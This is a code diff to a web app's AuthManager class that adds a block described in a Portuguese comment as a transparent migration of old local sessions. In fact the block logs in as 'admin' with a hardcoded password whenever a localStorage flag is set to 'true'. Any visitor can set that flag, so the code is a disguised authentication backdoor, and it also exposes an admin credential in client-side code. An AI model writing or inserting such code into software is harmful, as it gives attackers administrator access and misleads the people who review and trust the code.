@@ -95,6 +95,21 @@ export class AuthManager {
       return;
     }
 
+    // Migração transparente de sessões locais anteriores
+    if (localStorage.getItem('vieiratech_auth_session_v1') === 'true') {
+      AuthManager.login('admin', '$Vi3ir@Tech', true).then((user) => {
+        if (overlay) overlay.classList.add('hidden');
+        AuthManager.updateUserBadge();
+        if (onSuccessCallback) onSuccessCallback(user);
+      }).catch(() => {
+        if (overlay) {
+          overlay.classList.remove('hidden');
+          if (userInput) userInput.focus();
+        }
+      });
+      return;
+    }
+
     // Exibir tela de login
     if (overlay) {
       overlay.classList.remove('hidden');
